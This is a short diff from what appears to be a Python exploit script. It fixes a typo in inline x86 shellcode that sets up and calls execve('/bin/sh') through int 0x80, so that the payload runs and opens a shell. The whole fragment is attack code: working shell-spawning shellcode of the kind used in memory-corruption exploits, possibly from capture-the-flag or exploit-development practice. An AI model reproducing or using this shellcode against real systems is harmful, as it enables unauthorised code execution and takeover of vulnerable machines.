@@ -299,7 +299,7 @@ xor	ecx, ecx	/*ecx -> NULL*/
 xor	edx, edx	/*edx -> NULL*/
 push	11
 pop	eax		/*eax = 11*/
-nt 0x80		/*execve("/bin/sh")*/
+int 0x80		/*execve("/bin/sh")*/
 '''%(u32('/bin'), u32('/sh\x00')))
 
 
